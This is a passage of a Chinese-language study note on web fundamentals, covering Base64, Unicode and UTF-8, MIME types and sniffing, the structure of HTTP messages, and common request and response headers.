是一组二进制到文本的编码方案，通过将其转换为 radix-64 表示形式，以 ASCII 字符串格式表示二进制数据。通过仅由 ASCII 字符组成，base64 字符串通常是 url 安全的，这就是为什么它们可用于在 Data URL 中编码数据。</p></blockquote><p>作用：</p><blockquote><p>Base64 编码方案通常用于需要对二进制数据进行编码的情况，这些数据需要通过设计用于处理 ASCII 的媒体进行存储和传输。这样是为了保证数据的完整并且不用在传输过程中修改这些数据。Base64 也被一些应用（包括使用 <a href="https://zh.wikipedia.org/wiki/%E5%A4%9A%E7%94%A8%E9%80%94%E4%BA%92%E8%81%AF%E7%B6%B2%E9%83%B5%E4%BB%B6%E6%93%B4%E5%B1%95">MIME</a> 的电子邮件）和在 <a href="https://developer.mozilla.org/zh-CN/docs/Web/XML">XML</a> 中储存复杂数据时使用。</p></blockquote><p>简单来说，信息从二进制方式变成文本方式</p><blockquote><p>Base64 编码在网络上的一个常见应用是对二进制数据进行编码，以便将其纳入 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Basics_of_HTTP/Data_URLs">data: URL</a> 中。</p></blockquote><p>附：Unicode： Unicode 是一个字符集，为世界上几乎所有的字符提供了唯一的标识符（Code Point）。</p><p>​UTF-8：UTF-8（Unicode Transformation Format - 8-bit）是一种编码方案，用于在计算机系统中以字节的形式表示 Unicode 中的字符。</p><p>关系：<br>Unicode 和 UTF-8 是两个相关但不同的概念，它们在字符编码领域有着密切的关系。</p><ol><li><strong>Unicode：</strong><ul><li><strong>定义：</strong> Unicode 是一个字符集，为世界上几乎所有的字符提供了唯一的标识符（Code Point）。</li><li><strong>特点：</strong> Unicode 提供了一个标准化的方式来表示和处理不同语言和符号的字符，以实现统一的字符编码方案。</li><li><strong>表示方式：</strong> Unicode 中的每个字符都有一个唯一的编号，称为 Code Point，通常用 U+XXXX 的形式表示，其中 “XXXX” 是十六进制的数字。</li></ul></li><li><strong>UTF-8：</strong><ul><li><strong>定义：</strong> UTF-8（Unicode Transformation Format - 8-bit）是一种编码方案，用于在计算机系统中以字节的形式表示 Unicode 中的字符。</li><li><strong>特点：</strong> UTF-8 是一种可变长度的编码方案，能够表示 Unicode 中的所有字符，但对于 ASCII 字符，它只需要一个字节，这使得它在存储和传输时更为高效。</li><li><strong>编码规则：</strong> UTF-8 的编码规则是根据字符的 Unicode Code Point 来确定不同长度的字节序列。</li></ul></li></ol><p><strong>关系：</strong></p><ul><li>Unicode 定义了字符集和每个字符的唯一标识（Code Point）。</li><li>UTF-8 是 Unicode 的一种实现方式，是一种将 Unicode 字符编码为字节序列的方法，可以在计算机系统中存储和传输文本数据。</li></ul><h3 id="MIME-类型（IANA-媒体类型）"><a href="#MIME-类型（IANA-媒体类型）" class="headerlink" title="MIME 类型（IANA 媒体类型）"></a>MIME 类型（IANA 媒体类型）</h3><h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><blockquote><p><strong>媒体类型</strong>（也通常称为<strong>多用途互联网邮件扩展</strong>或 <strong>MIME</strong> 类型）是一种标准，用来表示文档、文件或一组数据的性质和格式。它在 IETF 的 <a href="https://datatracker.ietf.org/doc/html/rfc6838">RFC 6838</a> 中进行了定义和标准化。</p></blockquote><p>附：IANA：互联网号码分配局，负责跟踪所有官方 MIME 类型。</p><h4 id="MIME结构"><a href="#MIME结构" class="headerlink" title="MIME结构"></a>MIME结构</h4><p>1.MIME 类型通常仅包含两个部分：<em>类型</em>（type）和<em>子类型</em>（subtype），中间由斜杠 <code>/</code> 分割，中间没有空白字符：</p><p>结构：<code>type/subtype</code></p><ul><li><strong>类型(type)<strong>：表示数据的大致分类，如</strong>video</strong>或<strong>text</strong></li><li>**子类型(subtype)**：MIME 类型所代表的指定类型的确切数据类型。以 <code>text</code> 类型为例，它的子类型包括：<code>plain</code>（纯文本）、<code>html</code>（<a href="https://developer.mozilla.org/zh-CN/docs/Glossary/HTML">HTML</a> 源代码）、<code>calender</code>（iCalendar&#x2F;<code>.ics</code> 文件）。</li></ul><p>2.结构里允许参数</p><figure class="highlight vhdl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span>/<span class="keyword">subtype</span>;<span class="keyword">parameter</span>=value</span><br></pre></td></tr></table></figure><blockquote><p>例如，对于主类型为 <code>text</code> 的任何 MIME 类型，可以添加可选的 <code>charset</code> 参数，以指定数据中的字符所使用的字符集。如果没有指定 <code>charset</code>，默认值为 <a href="https://developer.mozilla.org/zh-CN/docs/Glossary/ASCII">ASCII</a>（<code>US-ASCII</code>），除非被<a href="https://developer.mozilla.org/zh-CN/docs/Glossary/User_agent">用户代理的</a>设置覆盖。要指定 UTF-8 文本文件，则使用 MIME 类型 <code>text/plain;charset=UTF-8</code>。</p></blockquote><p>附：UTF-8完美兼容ASCII字符</p><p>3.MIME类型有两类：<strong>独立的</strong>（discrete）和<strong>多部分的</strong>（multipart）。</p><p>独立类型（IANA目前已注册的）</p><ul><li>application：不明确属于其他类型之一的任何二进制数据。</li><li>audio：音频或音乐数据。常见的示例如 <code>audio/mpeg</code>、<code>audio/vorbis</code>。</li><li>example：在演示如何使用 MIME 类型的示例中用作占位符的保留类型。也可以作为子类型。</li><li>font：字体&#x2F;字型数据。常见的示例如 <code>font/woff</code>、<code>font/ttf</code> 和 <code>font/otf</code>。</li><li>image：图像或图形数据，常见的例子有 <code>image/jpeg</code>、<code>image/png</code> 和 <code>image/svg+xml</code>。</li><li>model：三维物体或场景的模型数据。示例包含 <code>model/3mf</code> 和 <code>model/vrml</code>。</li><li>text：纯文本数据，示例包含：<code>text/plain</code>、<code>text/csv</code> 和 <code>text/html</code>。</li><li>video：视频数据或文件，例如 MP4 电影（<code>video/mp4</code>）。</li></ul><p>多部分类型</p><blockquote><p><strong>多部分</strong>类型指的是一类可分成不同部分的文件，其各部分通常是不同的 MIME 类型；也可用于——尤其在电子邮件中——表示属于同一事务的多个独立文件。它们代表一个<strong>复合文档</strong>。</p></blockquote><p>有两种多部分类型(初学没有深入了解)：</p><blockquote><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Basics_of_HTTP/MIME_Types#message"><code>message</code></a></p><p>封装其他信息的信息。例如，这可以用来表示将转发信息作为其数据一部分的电子邮件，或将超大信息分块发送，就像发送多条信息一样。例如，<code>message/rfc822</code>（用于转发或回复信息的引用）和 <code>message/partial</code>（允许将大段信息自动拆分成小段，由收件人重新组装）是两个常见的例子。（<a href="https://www.iana.org/assignments/media-types/media-types.xhtml#message">查看 IANA 上 message 类型的注册表</a>）</p><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Basics_of_HTTP/MIME_Types#multipart"><code>multipart</code></a></p><p>由多个组件组成的数据，这些组件可能各自具有不同的 MIME 类型。例如，<code>multipart/form-data</code>（用于使用 <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/FormData"><code>FormData</code></a> API 生成的数据）和 <code>multipart/byteranges</code>（定义于 <a href="https://datatracker.ietf.org/doc/html/rfc7233#section-5.4.1">RFC 7233, section 5.4.1</a>，当获取到的数据仅为部分内容时——如使用 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Range"><code>Range</code></a> 标头传输的内容——与返回的 <a href="https://developer.mozilla.org/zh-CN/docs/Glossary/HTTP">HTTP</a> 响应 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/206"><code>206</code></a> “Partial Content”组合使用）。（<a href="https://www.iana.org/assignments/media-types/media-types.xhtml#multipart">查看 IANA 上 multipart 类型的注册表</a>）</p></blockquote><h4 id="对Web开发者至关重要的MIME类型"><a href="#对Web开发者至关重要的MIME类型" class="headerlink" title="对Web开发者至关重要的MIME类型"></a>对Web开发者至关重要的MIME类型</h4><p><strong>application&#x2F;octet-stream</strong></p><blockquote><p>这是二进制文件的默认值.。由于这意味着<em>未知的二进制文件</em>，浏览器一般不会自动执行或询问执行。</p></blockquote><p><strong>text&#x2F;plain</strong></p><blockquote><p>这是文本文件的默认值。即使它其实意味着<em>未知的文本文件</em>，但浏览器认为是可以直接展示的。</p></blockquote><p>text&#x2F;css</p><blockquote><p>在网页中要被解析为 CSS 的任何 CSS 文件<strong>必须</strong>指定 MIME 为 <code>text/css</code>。通常，如果服务器不识别 CSS 文件的 <code>.css</code> 后缀，则可能将它们以 MIME 为 <code>text/plain</code> 或 <code>application/octet-stream</code> 来发送给浏览器：在这种情况下，大多数浏览器不将其识别为 CSS 文件而直接忽略。</p></blockquote><p>text&#x2F;html</p><blockquote><p>所有的 HTML 内容都应该使用这种类型。</p></blockquote><p>text&#x2F;javascript</p><blockquote><p>JavaScript 内容应始终使用 MIME 类型 <code>text/javascript</code> 提供。其他 MIME 类型对 JavaScript 无效，使用除 <code>text/javascript</code> 以外的任何 MIME 类型都可能导致脚本无法加载或运行。另外，。对于 JavaScript 内容来说，<code>charset</code> 参数无效，在大多数情况下会导致脚本加载失败。</p></blockquote><p>以下是常用的图像类型，可在网页中<em>安全</em>使用：</p><ul><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/Media/Formats/Image_types#apng_animated_portable_network_graphics"><code>image/apng</code></a>：动画便携式网络图形（APNG）</li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/Media/Formats/Image_types#avif_%E5%9B%BE%E5%83%8F"><code>image/avif</code></a>：AV1 图像文件格式（AVIF）</li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/Media/Formats/Image_types#gif_graphics_interchange_format"><code>image/gif</code></a>：图形交换格式（GIF）</li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/Media/Formats/Image_types#jpeg_joint_photographic_experts_group_image"><code>image/jpeg</code></a>：联合图像专家小组图片（JPEG）</li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/Media/Formats/Image_types#png_portable_network_graphics"><code>image/png</code></a>：便携式网络图形（PNG）</li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/Media/Formats/Image_types#svg_scalable_vector_graphics"><code>image/svg+xml</code></a>：可缩放矢量图形（SVG）</li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/Media/Formats/Image_types#webp_%E5%9B%BE%E5%83%8F"><code>image/webp</code></a>：Web 图像格式（WEBP）</li></ul><p><strong>multipart&#x2F;form-data</strong></p><p>multipart&#x2F;form-data可用于HTML表单发送信息给服务器</p><p>multipart&#x2F;byteranges</p><p><code>multipart/byteranges</code> 用于把部分的响应报文发送回浏览器。</p><h4 id="正确设置MIME类型"><a href="#正确设置MIME类型" class="headerlink" title="正确设置MIME类型"></a>正确设置MIME类型</h4><blockquote><p>很多 web 服务器使用默认的 <code>application/octet-stream</code> 来发送未知类型。出于一些安全原因，对于这些资源浏览器不允许设置一些自定义默认操作，强制用户必须存储到本地以使用。</p></blockquote><p>常见的导致服务器配置错误的文件类型如下所示：</p><ul><li>RAR 压缩文件。在这种情况，理想状态是，设置真实的编码文件类型；但这通常不可能，因为 .RAR 文件可能包含多种不同类型的资源。这种情况，将所发送文件的 MIME 类型配置为 <code>application/x-rar-compressed</code>。</li><li>音频或视频文件。只有正确设置了 MIME 类型的文件才能被 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/video">&#96;&#96;</a> 或<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/audio">&#96;&#96;</a> 元素识别和播放。请确保指定了正确的<a href="https://developer.mozilla.org/zh-CN/docs/Web/Media/Formats">音频和视频的媒体类型</a>。</li><li>专有文件类型。避免使用 <code>application/octet-stream</code>，对于这种一般的 MIME 类型浏览器不允许定义默认行为（比如“在 Word 中打开”）。像 <code>application/vnd.mspowerpoint</code> 这样的类型可以让用户选择自动在幻灯片软件中打开这样的文件。</li></ul><h4 id="MIME嗅探"><a href="#MIME嗅探" class="headerlink" title="MIME嗅探"></a>MIME嗅探</h4><blockquote><p>在缺失 MIME 类型或客户端认为文件设置了错误的 MIME 类型时，浏览器可能会通过查看资源来进行 <em>MIME 嗅探</em>。</p></blockquote><p>简单来说即是通过其他方法得知数据类型。</p><blockquote><p>由于某些 MIME 类型可能代表可执行内容，会存在一些安全问题。服务器可以通过发送 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/X-Content-Type-Options"><code>X-Content-Type-Options</code></a> 标头来阻止 MIME 嗅探。</p></blockquote><p>可知MIME嗅探并非是一件好事，比如xss攻击等等，一些安全专业人士主张禁用或限制 MIME 嗅探，并强调在服务器端正确设置 “Content-Type” 标头以提供准确的文件类型信息。此外，使用 <code>X-Content-Type-Options</code> 头来控制浏览器是否进行 MIME 嗅探也是一种辅助措施。</p><h4 id="其他传送文件类型的方法"><a href="#其他传送文件类型的方法" class="headerlink" title="其他传送文件类型的方法"></a>其他传送文件类型的方法</h4><blockquote><ul><li>有时会使用名称后缀，特别是在 Microsoft Windows 系统上。并非所有的操作系统都认为这些后缀是有意义的（特别是 Linux 和 Mac OS），并且像外部 MIME 类型一样，不能保证它们是正确的。</li><li>魔数（magic number）。不同类型的文件的语法通过查看结构来允许文件类型推断。例如，每个 GIF 文件以 <code>47 49 46 38 39</code> 十六进制值（<code>GIF89</code>）开头，每个 PNG 文件以 <code>89 50 4E 47</code>（<code>.PNG</code>）开头。并非所有类型的文件都有魔数，所以这也不是 100％ 可靠的方式。</li></ul></blockquote><h2 id="HTTP指南"><a href="#HTTP指南" class="headerlink" title="HTTP指南"></a>HTTP指南</h2><h3 id="HTTP概述"><a href="#HTTP概述" class="headerlink" title="HTTP概述"></a>HTTP概述</h3><blockquote><p><strong>HTTP</strong> 是一种用作获取诸如 HTML 文档这类资源的<a href="https://developer.mozilla.org/zh-CN/docs/Glossary/Protocol">协议</a>。它是 Web 上进行任何数据交换的基础，同时，也是一种客户端—服务器（client-server）协议</p></blockquote><p>客户端和服务器之间通过HTTP协议通过交换一个个独立的消息（而非数据流）进行通信。客户端发出的消息称为<strong>请求（request）</strong>，服务端接收的应答消息称为<strong>响应（response）</strong>。</p><h4 id="基于HTTP的组件系统"><a href="#基于HTTP的组件系统" class="headerlink" title="基于HTTP的组件系统"></a>基于HTTP的组件系统</h4><p><img src="/./../../../web%E5%AE%89%E5%85%A8/WEB%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E7%9F%A5%E8%AF%86%E7%AF%87/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/client-server-chain-1706253428232-5.png" alt="客户端与服务器间的链条"></p><p>客户端(Client)：用户代理</p><blockquote><p><em>用户代理</em>是任何能够代表用户行为的工具。这类工具以浏览器为主，不过，它也可能是工程师和 Web 开发人员调试应用所使用的那些程序。</p></blockquote><p>一般情况下总是浏览器发起请求而非是服务端，不过后来加入了一些机制，能够模拟由服务端发出的消息。</p><p>Web服务端(Server)：</p><blockquote><p>在上述通信过程的另一侧是服务端，它<em>负责提供</em>客户端所请求的文档。一个服务端可以假装表现为仅有一台机器，但实际上，它可以是共享负载的一组服务器集群（负载均衡）或是其他类型的软件（如缓存、数据库服务、电商服务等），按需完整或部分地生成文档。</p></blockquote><p>此外，一个服务器可以不仅仅只有一台机器，而多个服务端软件实例也可部署在同一台机器上。</p><p>代理：</p><blockquote><p>在浏览器和服务器之间，有许多计算机和设备参与传递了 HTTP 消息。依靠 Web 技术栈的层次化的结构，传递过程中的多数操作都位于传输层、网络层或物理层，它们对于 HTTP 应用层而言就是透明的，并默默地对网络性能产生着重要影响。还有一部分实体在应用层参与消息传递，一般被称为<strong>代理</strong>（Proxy）。代理可以是透明的，即转发它们收到的请求并不做任何修改，也可以表现得不透明，将它传递给服务端之前使用一些手段修改这个请求。代理可以发挥很多种作用：</p></blockquote><blockquote><ul><li>缓存（可以是公开的也可以是私有的，如浏览器的缓存）</li><li>过滤（如反病毒扫描、家长控制…）</li><li>负载均衡（让多个服务器服务不同的请求）</li><li>认证（控制对不同资源的访问）</li><li>日志（使得代理可以存储历史信息）</li></ul></blockquote><h4 id="HTTP的基本性质"><a href="#HTTP的基本性质" class="headerlink" title="HTTP的基本性质"></a>HTTP的基本性质</h4><ul><li>HTTP是简约的</li><li>HTTP是可扩展的：HTTP标头（header）</li><li>HTTP无状态，但并非无回会话</li><li>HTTP和网络连接</li></ul><h4 id="HTTP报文"><a href="#HTTP报文" class="headerlink" title="HTTP报文"></a>HTTP报文</h4><blockquote><p>HTTP&#x2F;1.1 以及更早的 HTTP 协议报文都是语义可读的。在 HTTP&#x2F;2 中，这些报文被嵌入到了一个新的二进制结构，帧。帧允许实现很多优化，比如报文标头的压缩以及多路复用。即使只有原始 HTTP 报文的一部分以 HTTP&#x2F;2 发送出来，每条报文的语义依旧不变，客户端会重组原始 HTTP&#x2F;1.1 请求。因此用 HTTP&#x2F;1.1 格式来理解 HTTP&#x2F;2 报文仍旧有效。</p></blockquote><p>请求报文：<img src="/./../../../web%E5%AE%89%E5%85%A8/WEB%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E7%9F%A5%E8%AF%86%E7%AF%87/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/http_request.png" alt="一个基础的 HTTP 请求"></p><ol><li>一个HTTP方法，可以是GET，POST等等，以此定义客户端执行的操作</li><li>要获取的资源的路径</li><li>HTTP协议版本号</li><li>请求头，又称为HTTP标头</li><li>请求体</li></ol><p>响应报文：<img src="/./../../../web%E5%AE%89%E5%85%A8/WEB%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E7%9F%A5%E8%AF%86%E7%AF%87/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/http_response.png" alt="HTTP 响应的图片"></p><ol><li>HTTP协议版本号</li><li>一个状态码，指明操作是否成功以及原因</li><li>一个状态信息，这个信息是一个不权威、简短的状态码描述</li><li>响应头，与请求头相似</li><li>可选项，一个包含了被获取资源的主体</li></ol><p>附：API：API就像一家餐厅中的点餐窗口，提供了一个标准化的接口，使得应用程序能够与服务进行交互，请求执行特定的功能或获取数据。这种交互通过HTTP协议实现，就像服务员在点餐窗口和厨房之间传递顾客的需求和厨房的服务一样</p><p>附：HTTP&#x2F;2与HTTP&#x2F;1.1有几处基本的不同：</p><blockquote><ul><li>HTTP&#x2F;2 是二进制协议而不是文本协议。不再可读，也不可无障碍的手动创建，改善的优化技术现在可被实施。</li><li>这是一个多路复用协议。并行的请求能在同一个链接中处理，移除了 HTTP&#x2F;1.x 中顺序和阻塞的约束。</li><li>压缩了标头。因为标头在一系列请求中常常是相似的，其移除了重复和传输重复数据的成本。</li><li>其允许服务器在客户端缓存中填充数据，通过一个叫服务器推送的机制来提前请求。</li></ul></blockquote><h3 id="HTTP标头-header"><a href="#HTTP标头-header" class="headerlink" title="HTTP标头(header)"></a>HTTP标头(header)</h3><p>推荐：<a href="https://juejin.cn/post/6844903745004765198">https://juejin.cn/post/6844903745004765198</a></p><h4 id="请求头"><a href="#请求头" class="headerlink" title="请求头"></a>请求头</h4><h5 id="分类："><a href="#分类：" class="headerlink" title="分类："></a>分类：</h5><blockquote><ul><li><a href="https://developer.mozilla.org/zh-CN/docs/Glossary/General_header">通用标头（General header）</a>，例如 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Via"><code>Via</code></a>，适用于整个消息。</li><li><a href="https://developer.mozilla.org/zh-CN/docs/Glossary/Request_header">请求标头（Request header）</a>，例如 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/User-Agent"><code>User-Agent</code></a>、<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Accept-Type"><code>Accept-Type</code></a>，通过进一步的定义（例如 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Accept-Language"><code>Accept-Language</code></a>）、给定上下文（例如 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Referer"><code>Referer</code></a>）或者进行有条件的限制（例如 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/If-None"><code>If-None</code></a>）来修改请求。</li><li><a href="https://developer.mozilla.org/zh-CN/docs/Glossary/Representation_header">表示标头（Representation header）</a>，例如 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Type"><code>Content-Type</code></a> 描述了消息数据的原始格式和应用的任意编码（仅在消息有主体时才存在）。</li></ul></blockquote><h5 id="常用请求头："><a href="#常用请求头：" class="headerlink" title="常用请求头："></a>常用请求头：</h5><h6 id="1-Accept"><a href="#1-Accept" class="headerlink" title="1.Accept"></a>1.Accept</h6><p>Accept: type&#x2F;subtype，浏览器可以接受服务器发来的数据类型</p><h6 id="2-Accept-Encoding"><a href="#2-Accept-Encoding" class="headerlink" title="2.Accept-Encoding"></a>2.Accept-Encoding</h6><blockquote><p>浏览器申明自己接收的编码方法，通常指定压缩方法，是否支持压缩，支持什么压缩方法（注意：这不是只字符编码）。</p></blockquote><h6 id="3-Accept-Language"><a href="#3-Accept-Language" class="headerlink" title="3.Accept-Language"></a>3.Accept-Language</h6><p>浏览器申明自己接受的语言 </p><h6 id="4-Connecction"><a href="#4-Connecction" class="headerlink" title="4.Connecction"></a>4.Connecction</h6><ul><li><strong>Connection: keep-alive</strong> ：建立稳定的TCP链接，客户端下次访问此处时会继续使用该链接</li><li><strong>Connection: close</strong> ：当前Request完成后，客户端和服务器之间用于传输HTTP数据的TCP连接会关闭， 当客户端再次发送Request，需要重新建立TCP连接。</li></ul><h6 id="5-Host-必须的"><a href="#5-Host-必须的" class="headerlink" title="5.Host(必须的)"></a>5.Host(必须的)</h6><p>目标主机和端口号，通常在URL里提取</p><h6 id="6-Referer"><a href="#6-Referer" class="headerlink" title="6.Referer"></a>6.Referer</h6><p>告诉服务器我从哪个页面来</p><h6 id="7-User-Agent"><a href="#7-User-Agent" class="headerlink" title="7.User-Agent"></a>7.User-Agent</h6><p>告诉HTTP服务器， 客户端使用的操作系统和浏览器的名称和版本</p><h6 id="8-Cache-Control"><a href="#8-Cache-Control" class="headerlink" title="8.Cache-Control"></a>8.Cache-Control</h6><p>值：</p><ul><li>private：默认值，应只能够作为私有的缓存，不能在用户间共享</li><li>public：响应会被缓存，并且在多用户间共享。</li><li>must-revalidate：响应在特定条件下会被重用，以满足接下来的请求，但是它必须到服务器端去验证它是不是仍然是最新的</li><li>no-cache：响应不会被缓存,而是实时向服务器端请求资源</li><li>max-age&#x3D;num：设置缓存最大的有效时间，但是这个参数定义的是时间大小（比如：60）而不是确定的时间点。单位是[秒 seconds]。</li><li>no-store：任何条件下，响应都不会被缓存，并且不会被写入到客户端的磁盘里，这也是基于安全考虑的某些敏感的响应才会使用这个。</li></ul><h6 id="9-Cookie"><a href="#9-Cookie" class="headerlink" title="9.Cookie"></a>9.Cookie</h6><p>Cookie是用来存储一些用户信息以便让服务器辨别用户身份</p><h6 id="10-Range（用于断点续传）"><a href="#10-Range（用于断点续传）" class="headerlink" title="10.Range（用于断点续传）"></a>10.Range（用于断点续传）</h6><p>Range:bytes&#x3D;0-5：指定第一个字节的位置和最后一个字节的位置。用于告诉服务器自己想取对象的哪部分。</p><h6 id="11-X-Forwarded-For"><a href="#11-X-Forwarded-For" class="headerlink" title="11.X-Forwarded-For"></a>11.X-Forwarded-For</h6><p>该标头用来表示 HTTP 请求端真实 IP，可伪造</p><h5 id="概览"><a href="#概览" class="headerlink" title="概览"></a>概览</h5><ul><li><p>Accept：指定客户端能够接收的内容类型。</p></li><li><p>Accept-Charset：浏览器可以接受的字符编码集。</p></li><li><p>Accept-Encoding：指定浏览器可以支持的web服务器返回内容压缩编码类型。</p></li><li><p>Accept-Language：浏览器可接受的语言。</p></li><li><p>Accept-Ranges：可以请求网页实体的一个或者多个子范围字段。</p></li><li><p>AuthorizationHTTP：授权的授权证书。</p></li><li><p>Cache-Control：指定请求和响应遵循的缓存机制。</p></li><li><p>Connection：表示是否需要持久连接。（HTTP 1.1默认进行持久连接）</p></li><li><p>CookieHTTP：请求发送时，会把保存在该请求域名下的所有cookie值一起发送给web服务器。</p></li><li><p>Content-Length：请求的内容长度。</p></li><li><p>Content-Type：请求的与实体对应的MIME信息。</p></li><li><p>Date：请求发送的日期和时间。</p></li><li><p>Expect：请求的特定的服务器行为。</p></li><li><p>From：发出请求的用户的Email。</p></li><li><p>Host：指定请求的服务器的域名和端口号。</p></li><li><p>If-Match：只有请求内容与实体相匹配才有效。</p></li><li><p>If-Modified-Since：如果请求的部分在指定时间之后被修改则请求成功，未被修改则返回304代码。</p></li><li><p>If-None-Match：如果内容未改变返回304代码，参数为服务器先前发送的Etag，与服务器回应的Etag比较判断是否改变。</p></li><li><p>If-Range：如果实体未改变，服务器发送客户端丢失的部分，否则发送整个实体。</p></li><li><p>If-Unmodified-Since：只在实体在指定时间之后未被修改才请求成功。</p></li><li><p>Max-Forwards：限制信息通过代理和网关传送的时间。</p></li><li><p>Pragma：用来包含实现特定的指令。</p></li><li><p>Proxy-Authorization：连接到代理的授权证书。</p></li><li><p>Range：只请求实体的一部分，指定范围。</p></li><li><p>Referer：先前网页的地址，当前请求网页紧随其后,即来路。</p></li><li><p>TE：客户端愿意接受的传输编码，并通知服务器接受接受尾加头信息。</p></li><li><p>Upgrade：向服务器指定某种传输协议以便服务器进行转换（如果支持。</p></li><li><p>User-AgentUser-Agent：的内容包含发出请求的用户信息。</p></li><li><p>Via：通知中间网关或代理服务器地址，通信协议。</p></li><li><p>Warning：关于消息实体的警告信息</p></li></ul><h4 id="响应头"><a href="#响应头" class="headerlink" title="响应头"></a>响应头</h4><h5 id="分类：-1"><a href="#分类：-1" class="headerlink" title="分类："></a>分类：</h5><blockquote><ul><li><a href="https://developer.mozilla.org/zh-CN/docs/Glossary/General_header">通用标头（General header）</a>，例如 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Via"><code>Via</code></a>，适用于整个消息。</li><li><a href="https://developer.mozilla.org/zh-CN/docs/Glossary/Response_header">响应标头（Response header）</a>，例如 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Vary"><code>Vary</code></a> 和 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Accept-Ranges"><code>Accept-Ranges</code></a>，提供有关服务器的其他信息，这些信息不适合状态行。</li><li><a href="https://developer.mozilla.org/zh-CN/docs/Glossary/Representation_header">表示标头（Representation header）</a>，例如 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Type"><code>Content-Type</code></a> 描述了消息数据的原始格式和应用的任意编码（仅在消息有主体时才存在）</li></ul></blockquote><h5 id="常见响应头："><a href="#常见响应头：" class="headerlink" title="常见响应头："></a>常见响应头：</h5><h6 id="1-Cache-Control"><a href="#1-Cache-Control" class="headerlink" title="1.Cache-Control"></a>1.Cache-Control</h6><p>（对应请求中的Cache-Control）</p><h6 id="2-Content-Type"><a href="#2-Content-Type" class="headerlink" title="2..Content-Type"></a>2..<strong>Content-Type</strong></h6><p>告诉客户端资源文件的类型以及相应的<strong>字符</strong>编码方式。（注意，这里是字符编码而不是传输编码）</p><h6 id="3-Content-Encoding"><a href="#3-Content-Encoding" class="headerlink" title="3.Content-Encoding"></a>3.Content-Encoding</h6><p>告诉客户端二进制资源通过什么方式(比如gzip)对二进制资源实体进行压缩。</p><p>附：gzip 是一种压缩算法，用于将二进制数据流（包括文本和其他数据类型）进行压缩。gzip 并不是将文本编码成二进制数据流，而是对已有的二进制数据进行压缩，以减小数据的体积。</p><h6 id="4-Date"><a href="#4-Date" class="headerlink" title="4.Date"></a>4.Date</h6><blockquote><p><strong>Date: Tue, 03 Apr 2018 03:52:28 GMT</strong> 这个是服务端发送资源时的服务器时间，GMT是格林尼治所在地的标准时间。http协议中发送的时间都是GMT的，这主要是解决在互联网上，不同时区在相互请求资源的时候，时间混乱问题。</p></blockquote><h6 id="5-Server"><a href="#5-Server" class="headerlink" title="5.Server"></a>5.Server</h6><p>表明服务器类型和对应的版本</p><h6 id="6-Transfer-Encoding"><a href="#6-Transfer-Encoding" class="headerlink" title="6.Transfer-Encoding"></a>6.Transfer-Encoding</h6><blockquote><p><strong>Transfer-Encoding：chunked</strong> 这个响应头告诉客户端，服务器发送的资源的方式是分块发送的。一般分块发送的资源都是服务器动态生成的，在发送时还不知道发送资源的大小，所以采用分块发送，每一块都是独立的，独立的块都能标示自己的长度，最后一块是0长度的，当客户端读到这个0长度的块时，就可以确定资源已经传输完了。</p></blockquote><h6 id="7-Expires"><a href="#7-Expires" class="headerlink" title="7.Expires"></a>7.Expires</h6><blockquote><p><strong>Expires:Sun, 1 Jan 2000 01:00:00 GMT</strong> 这个响应头也是跟缓存有关的，告诉客户端在这个时间前，可以直接访问缓存副本，很显然这个值会存在问题，因为客户端和服务器的时间不一定会都是相同的，如果时间不同就会导致问题。所以这个响应头是没有Cache-Control：max-age&#x3D;*这个响应头准确的，因为max-age&#x3D;date中的date是个相对时间，不仅更好理解，也更准确。</p></blockquote><h6 id="8-Last-Modified"><a href="#8-Last-Modified" class="headerlink" title="8.Last-Modified"></a>8.Last-Modified</h6><blockquote><p><strong>Last-Modified: Dec, 26 Dec 2015 17:30:00 GMT</strong> 所请求的对象的最后修改日期(按照 RFC 7231 中定义的“超文本传输协议日期”格式来表示)</p></blockquote><h6 id="9-Connection"><a href="#9-Connection" class="headerlink" title="9.Connection"></a>9.Connection</h6><p><strong>Connection：keep-alive</strong> 回应客户端的Connection：keep-alive，告诉客户端服务器的tcp连接也是一个长连接，客户端可以继续使用这个tcp连接发送http请求。</p><h6 id="10-Etag"><a href="#10-Etag" class="headerlink" title="10.Etag"></a>10.Etag</h6><blockquote><p><strong>ETag: “737060cd8c284d8af7ad3082f209582d”</strong> 